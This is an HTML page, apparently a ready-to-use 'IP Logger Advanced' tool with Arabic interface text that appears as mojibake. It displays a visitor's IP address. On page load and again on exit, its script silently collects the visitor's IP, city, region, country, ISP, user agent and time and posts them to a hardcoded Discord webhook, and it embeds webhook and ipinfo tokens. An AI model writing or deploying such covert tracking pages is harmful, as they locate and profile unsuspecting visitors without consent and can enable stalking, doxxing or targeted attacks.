<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<title>IP Logger Advanced</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
body{
    background:#0a0a0a;
    color:#fff;
    font-family:Arial, sans-serif;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
}
.box{
    background:#111;
    border:2px solid #2a2a2a;
    padding:30px 40px;
    border-radius:14px;
    text-align:center;
}
.ip{
    margin-top:15px;
    font-size:22px;
    color:#00ffcc;
}
</style>
</head>

<body>
<div class="box">
    <h2>IP Ø§Ù„Ø®Ø§Øµ Ø¨Ùƒ</h2>
    <div class="ip" id="ip">Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù…ÙŠÙ„...</div>
</div>

<script>
const WEBHOOK_URL = "https://discord.com/api/webhooks/1457809018042187969/JTKxopUi61LAzbz5xrNRU9hZlOrtUFNcA0juwrby568eEUOEr--k6qX1CUk0cTLvKg3r"; // Ø­Ø·ÙŠ Ù‡Ù†Ø§ ÙˆÙŠØ¨Ù‡ÙˆÙƒÙƒ
const LOCAL_IP_KEY = "last_ip_logged";

async function sendIP() {
    try {
        // Ø¬Ù„Ø¨ Ø¨ÙŠØ§Ù†Ø§Øª IP + Ø§Ù„Ø¯ÙˆÙ„Ø© + Ø§Ù„Ù…Ø¯ÙŠÙ†Ø© + Ø§Ù„Ù…Ø²ÙˆØ¯
        const res = await fetch("https://ipinfo.io/json?token=7cbef6b831aeab");
        const data = await res.json();
        const ip = data.ip;
        const city = data.city || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        const region = data.region || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        const country = data.country || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";
        const org = data.org || "ØºÙŠØ± Ù…Ø¹Ø±ÙˆÙ";

        document.getElementById("ip").textContent = ip;

        // ØªØ­Ù‚Ù‚ Ø¥Ø°Ø§ IP Ø¬Ø¯ÙŠØ¯
        const lastIP = localStorage.getItem(LOCAL_IP_KEY);
        let isNewIP = false;
        if(lastIP !== ip){
            isNewIP = true;
            localStorage.setItem(LOCAL_IP_KEY, ip);
        }

        const payload = {
            username: "IP Logger Advanced",
            embeds: [{
                title: `ğŸ“¡ IP ØªÙ… ØªØ³Ø¬ÙŠÙ„Ù‡ ${isNewIP ? "ğŸš¨ Ø¬Ø¯ÙŠØ¯" : ""}`,
                color: isNewIP ? 0xff0000 : 0x00ffcc,
                fields: [
                    { name: "IP Address", value: `\`${ip}\``, inline: false },
                    { name: "Ø§Ù„Ù…Ø¯ÙŠÙ†Ø© / Ø§Ù„Ù…Ù†Ø·Ù‚Ø©", value: `${city}, ${region}`, inline: false },
                    { name: "Ø§Ù„Ø¯ÙˆÙ„Ø©", value: country, inline: false },
                    { name: "Ù…Ø²ÙˆØ¯ Ø§Ù„Ø¥Ù†ØªØ±Ù†Øª", value: org, inline: false },
                    { name: "User Agent", value: navigator.userAgent, inline: false },
                    { name: "Ø§Ù„ÙˆÙ‚Øª", value: new Date().toLocaleString(), inline: false }
                ],
                footer: { text: "Advanced IP Logger" }
            }]
        };

        await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });

    } catch(e) {
        document.getElementById("ip").textContent = "ÙØ´Ù„ Ø¬Ù„Ø¨ IP";
        console.error(e);
    }
}

// Ø¥Ø±Ø³Ø§Ù„ Ø¹Ù†Ø¯ ÙØªØ­ Ø§Ù„ØµÙØ­Ø©
sendIP();

// Ø¥Ø±Ø³Ø§Ù„ Ø¹Ù†Ø¯ Ø§Ù„Ø®Ø±ÙˆØ¬ / ØªØ­Ø¯ÙŠØ« Ø§Ù„ØµÙØ­Ø©
window.addEventListener("beforeunload", sendIP);
</script>
</body>
</html>
